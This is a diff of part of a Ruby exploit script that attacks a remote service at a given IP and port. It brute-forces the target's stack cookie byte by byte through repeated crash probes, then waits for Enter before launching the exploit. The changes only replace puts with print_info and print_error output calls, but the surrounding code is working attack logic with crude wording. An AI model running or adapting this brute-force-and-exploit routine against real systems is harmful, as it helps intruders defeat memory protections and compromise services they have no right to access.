@@ -82,7 +82,7 @@ s = [0]
 if ARGV.length < 3
     # test cookie
     while s.length < 8 do
-        puts "[+] searching for byte: #{s.length}"
+        print_info "searching for byte: #{s.length}"
         for c in 1..255
             print "\r#{c}"
             s1 = s + [c]
@@ -98,15 +98,15 @@ else
     # try it ?
     s = (ARGV[2]).gsub("\\x","").hex_decode
     if crash(s)
-        puts "Wrong cookie"
+        print_error "Wrong cookie"
         exit
     end
 end
 
-puts "Found cookie: #{s.hex_escape} #{s.length}"
+print_info "Found cookie: #{s.hex_escape} #{s.length}"
 
-puts "PRESS ENTER TO GIVE THE SHIT TO THE HOLE AT #{ip} #{port}"
+print_info "PRESS ENTER TO GIVE THE SHIT TO THE HOLE AT #{ip} #{port}"
 $stdin.gets 
 
 crash(s,false)
-puts "#{$count} connections"
+print_info "#{$count} connections"
